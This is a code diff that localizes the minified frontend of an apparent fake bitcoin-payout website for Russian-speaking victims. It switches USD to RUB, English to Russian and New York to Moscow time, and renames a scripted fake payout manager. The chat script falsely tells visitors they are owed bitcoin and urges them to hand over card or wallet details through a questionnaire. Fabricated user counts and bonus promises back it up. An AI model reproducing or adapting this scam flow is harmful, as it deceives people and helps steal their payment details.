@@ -1164,7 +1164,7 @@
             }, [a("div", [t._v("Total Paid")]), a("div", [a("span", {
                 staticClass: "text-numbers font-weight-bold",
                 domProps: {
-                    innerHTML: t._s(t.$numberWithSpaces(t.$store.getters.totalUserPayout) + " USD")
+                    innerHTML: t._s(t.$numberWithSpaces(t.$store.getters.totalUserPayout) + " RUB")
                 }
             })])]), a("div", {
                 staticClass: "pre-info-item px-3 py-1"
@@ -2256,7 +2256,7 @@
                 staticClass: "align-items-center d-flex pre-info-item px-3 py-1"
             }, [s("div", {
                 staticClass: "bit-lang-g-icon translate-rus"
-            }), t._v("English")])
+            }), t._v("Translated from ENG to RUS")])
         }
         ]
           , c = (s("7f7f"),
@@ -2442,7 +2442,7 @@
                     }, {
                         dateoffset: 85,
                         header: "Technical maintenance",
-                        text: "Due to a large influx of new users, we need to move the site to a more powerful server <br>25.10.2018 from 2:00 to 5:00 New York time the site will be unavailable.",
+                        text: "Due to a large influx of new users, we need to move the site to a more powerful server <br>25.10.2018 from 2:00 to 5:00 Moscow time the site will be unavailable.",
                         hashtags: ["news", "server", "maintenance"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2477,8 +2477,8 @@
                         }]
                     }, {
                         dateoffset: 125,
-                        header: "Good news! We are already 5,000 000!",
-                        text: "We have good news for you. <br>The total number of users worldwide exceeds 50 million users."),
+                        header: "Good news! We are already 5,000!",
+                        text: "We have good news for you. Today the number of users on our site in \n                            ".concat(this.$store.getters.geo.countryName, " has exceeded 5,000 people. <br>In honor of this event, we give a bonus of 1000 rubles to all active users!.<br>The total number of users worldwide exceeds 50 million users."),
                         hashtags: ["news", "joy", "growth", "weare5000", "notthelimit"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2622,7 +2622,7 @@
                     }, {
                         dateoffset: 240,
                         header: "Collecting euro bonuses",
-                        text: "Added a database of sites with bonus distributions in Euro currency. This will increase your daily income.",
+                        text: "Added a database of sites with bonus distributions in Euro currency. This will increase your daily income by an average of 100 rubles.",
                         hashtags: ["news", "bonuses", "euro"],
                         reactions: [{
                             alias: "thumbs up",
@@ -3193,7 +3193,11 @@
                 }
             })]), t.$afterExchange(this.$options.name) ? t._e() : s("div", {
                 staticClass: "text-center text-white text-numbers"
-            }, ), s("div", {
+            }, [s("span", {
+                domProps: {
+                    innerHTML: t._s(t.$usermoney().geoValue)
+                }
+            })]), s("div", {
                 staticClass: "text-center m-0 text-numbers d-flex align-items-center justify-content-center wallet-date",
                 staticStyle: {
                     "font-size": "1.2rem",
@@ -5058,11 +5062,11 @@
                 name: "Manager before details",
                 loadtime: 8,
                 isLoading: !0,
-                loadsteps: ["Connecting with manager Olivia to process withdrawal"],
-                statusMessage: "Olivia is currently online",
+                loadsteps: ["Connecting with manager Anna to process withdrawal"],
+                statusMessage: "Anna is currently online",
                 upsellType: "chat",
                 chat: {
-                    name: "Olivia Davis",
+                    name: "Anna Vitkovskaya",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5072,7 +5076,7 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ['{{greetingTime}}! My name is Olivia, I am the lead manager of the payout department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. Regarding this, I have a question: have you previously received a notification that you are entitled to a payout from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received it", "I don\'t remember", "I didn\'t notice"]}}', "I have an approved active request from your account to withdraw the bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need your completed questionnaire. I will look for this questionnaire now, it will take no more than a minute.{{loading:{duration:14}{delay:9}\"Searching for your questionnaire. Please wait...\"}}", "Thank you for waiting. I checked and could not find your questionnaire in our database. This means you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payout, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so we can exchange bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system reports that you are owed <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you request the payout within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
+                    chatPull: ['{{greetingTime}}! My name is Anna, I am the lead manager of the payout department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. Regarding this, I have a question: have you previously received a notification that you are entitled to a payout from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received it", "I don\'t remember", "I didn\'t notice"]}}', "I have an approved active request from your account to withdraw the bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need your completed questionnaire. I will look for this questionnaire now, it will take no more than a minute.{{loading:{duration:14}{delay:9}\"Searching for your questionnaire. Please wait...\"}}", "Thank you for waiting. I checked and could not find your questionnaire in our database. This means you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payout, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so we can exchange bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system reports that you are owed <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you request the payout within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
                 },
                 title: "Provide the details to which you wish to receive funds",
                 product: "",
@@ -5193,7 +5197,7 @@
                 statusMessage: "Your form has been sent to the manager",
                 upsellType: "chat",
                 chat: {
-                    name: "Olivia Davis",
+                    name: "Anna Vitkovskaya",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5261,7 +5265,7 @@
                 statusMessage: "Currency conversion completed successfully!",
                 upsellType: "chat",
                 chat: {
-                    name: "Olivia Davis",
+                    name: "Anna Vitkovskaya",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5463,7 +5467,7 @@
                 statusMessage: "Personal account activated",
                 upsellType: "chat",
                 chat: {
-                    name: "Olivia Davis",
+                    name: "Anna Vitkovskaya",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
